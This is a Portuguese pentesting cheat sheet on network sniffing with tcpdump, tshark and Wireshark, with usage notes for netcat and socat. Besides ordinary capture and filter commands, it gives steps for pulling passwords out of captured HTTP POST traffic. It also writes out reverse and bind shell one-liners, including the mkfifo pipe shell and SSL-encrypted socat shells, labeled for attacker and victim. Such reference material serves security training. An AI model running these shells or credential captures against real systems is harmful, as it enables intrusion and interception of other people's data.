# 🕵️ Sniffing e Análise de Rede

> Capturar, analisar e manipular tráfego de rede. Essencial para entender o que está acontecendo na rede.

---

## 🚀 Passo a Passo — Como fazer Sniffing de Rede

Você quer **ver o que está passando pela rede** — senhas, dados, conversas. Vamos começar do mais simples.

### Passo 1: Descobrir sua interface de rede
```bash
# Primeiro, veja quais interfaces de rede você tem
ip a
# Procure por algo como eth0, ens33, wlan0
```

### Passo 2: Capturar tudo (TCPDump)
```bash
# Agora capture tudo que passa pela interface (use sudo!)
sudo tcpdump -i eth0 -nn
# -i eth0 = interface (substitua pela sua)
# -nn = não resolver nomes (mais rápido)

# Para parar: Ctrl+C
```

### Passo 3: Filtrar só o que interessa
```bash
# Só tráfego HTTP (porta 80):
sudo tcpdump -i eth0 -nn port 80

# Só de um IP específico:
sudo tcpdump -i eth0 -nn host 192.168.1.1

# Só DNS (descobrir quais sites estão sendo acessados):
sudo tcpdump -i eth0 -nn port 53
```

### Passo 4: Salvar para analisar depois
```bash
# Salvar em arquivo .pcap
sudo tcpdump -i eth0 -w capture.pcap

# Depois, analise com tshark ou abra no Wireshark (GUI)
tshark -r capture.pcap
```

### Passo 5: Analisar com filtros (tshark)
```bash
# Ver só pacotes HTTP
tshark -r capture.pcap -Y "http"

# Ver senhas que foram enviadas
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data
```

### Resumo da ordem:
```
1. ip a              → descobrir interface
2. tcpdump -i eth0   → capturar tudo
3. tcpdump port 80   → filtrar só HTTP
4. tcpdump -w file   → salvar em arquivo
5. tshark -r file    → analisar com filtros
```

---

## Wireshark

Analisador de protocolos mais completo. Interface gráfica para inspecionar pacotes.

### Instalação
```bash
sudo apt install -y wireshark
# Para usar sem root:
sudo usermod -aG wireshark $USER
# Fazer logout/login depois
```

### Ferramentas de linha de comando

#### tshark (Wireshark via terminal)

```bash
# Listar interfaces
tshark -D

# Capturar na interface eth0
tshark -i eth0

# Capturar porta específica
tshark -i eth0 -f "tcp port 80"

# Capturar e salvar em arquivo
tshark -i eth0 -w capture.pcap

# Ler arquivo pcap
tshark -r capture.pcap

# Ler com filtro
tshark -r capture.pcap -Y "http"

# Extrair campos específicos
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri

# Contar pacotes
tshark -r capture.pcap | wc -l

# Estatísticas de protocolo
tshark -r capture.pcap -q -z io,phs
```

### Filtros Wireshark (Display Filters)

```
# Por IP
ip.addr == 192.168.1.1
ip.src == 192.168.1.1
ip.dst == 192.168.1.1

# Por porta
tcp.port == 80
tcp.dstport == 443
udp.port == 53

# Por protocolo
http
dns
tcp
udp
icmp
ssh
ftp

# Combinações
http && ip.src == 192.168.1.1
tcp.port == 80 && http
dns && ip.dst == 8.8.8.8

# Por conteúdo
http contains "password"
http.user_agent contains "curl"
dns.qry.name contains "target"

# Por tamanho
frame.len > 1000
frame.len < 100

# Por flags TCP
tcp.flags.syn == 1
tcp.flags.rst == 1
tcp.flags.fin == 1

# HTTP específico
http.request.method == "POST"
http.response.code == 200
http.host == "target.com"
```

### Capturas úteis

```bash
# Capturar tráfego HTTP completo
tshark -i eth0 -f "tcp port 80" -w http_capture.pcap

# Capturar apenas DNS
tshark -i eth0 -f "udp port 53" -w dns_capture.pcap

# Capturar com filtro BPF (antes de gravar)
tshark -i eth0 -f "host 192.168.1.100 and tcp port 22" -w ssh_capture.pcap

# Ler e filtrar depois
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri -e http.file_data
```

---

## TCPDump

Sniff de pacotes via terminal. Leve, rápido e presente em qualquer Linux.

### Instalação
```bash
sudo apt install -y tcpdump
```

### Flags principais

| Flag | O que faz |
|:---|:---|
| `-i` | Interface |
| `-n` | Não resolver DNS |
| `-nn` | Não resolver DNS nem portas |
| `-w` | Salvar em arquivo pcap |
| `-r` | Ler arquivo pcap |
| `-A` | Mostrar pacotes em ASCII |
| `-X` | Mostrar pacotes em hex + ASCII |
| `-v` / `-vv` / `-vvv` | Verbose crescente |
| `-c` | Número máximo de pacotes |
| `-s` | Tamanho do snapshot (0 = inteiro) |
| `-f` | Filtro BPF |
| `-l` | Output line-buffered (para grep) |

### Filtros BPF (Berkeley Packet Filter)

```
# Por host
host 192.168.1.1
src host 192.168.1.1
dst host 192.168.1.1

# Por porta
port 80
src port 443
dst port 22

# Por rede
net 192.168.1.0/24
src net 10.0.0.0/8

# Por protocolo
tcp
udp
icmp

# Combinações
host 192.168.1.1 and port 80
src 192.168.1.1 and (dst port 80 or dst port 443)
not port 22

# Por tamanho
greater 1000
less 100
```

### Exemplos práticos

```bash
# Capturar tudo na interface
sudo tcpdump -i eth0

# Sem resolver nomes (mais rápido)
sudo tcpdump -i eth0 -nn

# Porta específica
sudo tcpdump -i eth0 port 80

# Host específico
sudo tcpdump -i eth0 host 192.168.1.1

# HTTP traffic com verbose
sudo tcpdump -i eth0 -A 'tcp port 80'

# Salvar em arquivo
sudo tcpdump -i eth0 -w capture.pcap

# Ler arquivo
sudo tcpdump -r capture.pcap

# Combinar com grep
sudo tcpdump -i eth0 -nn -l | grep "GET\|POST"

# Packets com payload (dados)
sudo tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# DNS queries
sudo tcpdump -i eth0 -nn port 53

# SSL/TLS handshake
sudo tcpdump -i eth0 -nn port 443 -c 20

# ICMP (ping)
sudo tcpdump -i eth0 icmp

#SYN scan detection
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'
```

### Lendo captures
```bash
# Listar pacotes
tcpdump -r capture.pcap -nn

# Filtrar por IP
tcpdump -r capture.pcap host 192.168.1.1

# Mostrar conteúdo
tcpdump -r capture.pcap -A

# Estatísticas
tcpdump -r capture.pcap -q | head -20
```

---

## Netcat (nc)

A "faca suíça" de redes. Conexões, listeners, transferências, reverse shells.

### Instalação
```bash
sudo apt install -y netcat-openbsd
```

### Flags principais

| Flag | O que faz |
|:---|:---|
| `-l` | Modo listen (servidor) |
| `-v` | Verbose |
| `-n` | Não resolver DNS |
| `-p` | Porta |
| `-e` | Executar comando (conexão) |
| `-u` | UDP (padrão é TCP) |
| `-z` | Zero-I/O (só scan) |
| `-w` | Timeout |

### Exemplos práticos

```bash
# === CONEXÃO BÁSICA ===

# Listener (servidor)
nc -lvnp 4444

# Conectar (cliente)
nc 192.168.1.1 4444

# === REVERSE SHELL ===

# Na máquina atacante (listener):
nc -lvnp 4444

# Na vítima (conectar shell ao atacante):
nc 192.168.1.1 4444 -e /bin/bash

# Com Netcat que não tem -e (usar pipe):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.1.1 4444 >/tmp/f

# === BIND SHELL ===

# Na vítima (servidor com shell):
nc -lvnp 4444 -e /bin/bash

# No atacante (conectar):
nc 192.168.1.1 4444

# === TRANSFERÊNCIA DE ARQUIVOS ===

# Receber arquivo:
nc -lvnp 4444 > arquivo_recebido.bin

# Enviar arquivo:
nc 192.168.1.1 4444 < arquivo_enviar.bin

# === SCAN DE PORTAS ===

# Scan de portas
nc -zv 192.168.1.1 1-1000

# Range de portas
nc -zv 192.168.1.1 20-30

# === CHAT SIMPLES ===

# Máquina A:
nc -lvnp 4444

# Máquina B:
nc 192.168.1.1 4444
# Digite mensagens em ambas as pontas

# === WEB SERVER SIMPLES ===

# Servir arquivo via HTTP:
while true; do echo -e "HTTP/1.1 200 OK\r\n\r\n$(cat index.html)" | nc -lvnp 80; done
```

---

## Socat

Netcat em esteroides. Suporta SSL, UDP, proxy, port forwarding.

### Instalação
```bash
sudo apt install -y socat
```

### Conceito fundamental

Socat conecta dois "endpoints" (ADDRESS). Formato:
```
socat ADDRESS1 ADDRESS2
```

### Endpoints mais usados

| Endpoint | Descrição |
|:---|:---|
| `TCP-LISTEN:PORT` | Escuta TCP |
| `TCP:HOST:PORT` | Conecta TCP |
| `OPENSSL-LISTEN:PORT` | Escuta com SSL |
| `OPENSSL:HOST:PORT` | Conecta com SSL |
| `STDIN` | Entrada padrão |
| `STDOUT` | Saída padrão |
| `EXEC:CMD` | Executa comando |

### Exemplos práticos

```bash
# === CONEXÃO BÁSICA ===

# Listener:
socat TCP-LISTEN:4444,reuseaddr,fork STDOUT

# Conectar:
socat - TCP:192.168.1.1:4444

# === REVERSE SHELL COM SSL ===

# Gerar certificado:
openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
cat server.key server.crt > server.pem

# Atacante (listener com SSL):
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 STDOUT

# Vítima (reverse shell criptografada):
socat OPENSSL:192.168.1.1:4444,verify=0 EXEC:/bin/bash

# === BIND SHELL COM SSL ===

# Vítima:
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,reuseaddr,fork EXEC:/bin/bash

# Atacante:
socat OPENSSL:192.168.1.1:4444,verify=0 STDIN

# === PORT FORWARDING ===

# Redirecionar porta 8080 para porta 80 do target:
socat TCP-LISTEN:8080,fork TCP:target.com:80

# === REVERSE SHELL SEM -e ===

# Usando socat para dar shell:
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# === TRANSFERÊNCIA COMPLETA ===

# Receber:
socat TCP-LISTEN:4444,reuseaddr FILE:arquivo_recebido.bin,create

# Enviar:
socat FILE:arquivo.bin TCP:192.168.1.1:4444

# === HTTPS SIMPLES ===

socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:80
```

### Socat vs Netcat

| Feature | Netcat | Socat |
|:---|:---|:---|
| SSL/TLS | Não | Sim |
| UDP | Sim | Sim |
| Port forwarding | Limitado | Completo |
| Proxy | Não | Sim |
| Execução de shell | `-e` | `EXEC:` |
| Fork | Não | Sim |

---

## Fluxo típico de Análise de Rede

```
1. TCPDump/Wireshark → capturar tráfego
        ↓
2. Filtros → isolar tráfego relevante (HTTP, DNS, etc)
        ↓
3. Analisar conteúdo → encontrar credenciais, dados sensíveis
        ↓
4. Netcat/Socat → testar conectividade, criar shells
        ↓
5. Documentar findings
```
